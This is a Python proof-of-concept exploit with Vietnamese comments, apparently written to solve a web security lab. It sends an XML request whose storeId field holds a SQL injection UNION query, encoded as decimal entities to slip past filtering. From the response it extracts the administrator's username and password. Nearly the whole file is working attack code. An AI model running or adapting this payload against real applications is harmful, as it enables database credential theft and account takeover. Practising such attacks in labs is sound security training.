import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Tắt cảnh báo SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def get_admin_credentials(host):
    url = f'{host}/product/stock'
    # Payload đã được XML encoded (Decimal)
    # Nội dung: 1 UNION SELECT username || ':' || password FROM users
    injection = '&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#58;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'

    xml_data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{injection}</storeId></stockCheck>'

    headers = {'Content-Type': 'text/xml'}

    try:
        print(f"[*] Đang gửi payload đến {url}...")
        res = requests.post(url, data=xml_data, headers=headers, verify=False)

        if 'administrator' in res.text:
            # Tìm dòng chứa administrator trong response
            for line in res.text.split():
                if 'administrator:' in line:
                    creds = line.replace('"', '').replace('<', '').split(':')
                    return creds[0], creds[1]
    except Exception as e:
        print(f"[x] Lỗi kết nối: {e}")
    return None


def main():
    if len(sys.argv) < 2:
        print("Sử dụng: python PoC.py <URL_LAB>")
        return

    host = sys.argv[1].strip().rstrip('/')

    print('[+] Đang thực hiện khai thác SQL Injection (XML Bypass)...')

    result = get_admin_credentials(host)

    if result:
        user, pw = result
        print("-" * 30)
        print(f"[!] THÀNH CÔNG!")
        print(f"[+] Username: {user}")
        print(f"[+] Password: {pw}")
        print("-" * 30)
        print(f"[*] Bây giờ hãy đăng nhập bằng mật khẩu này để hoàn thành Lab.")
    else:
        print("[-] Không tìm thấy thông tin administrator.")


if __name__ == "__main__":
    main()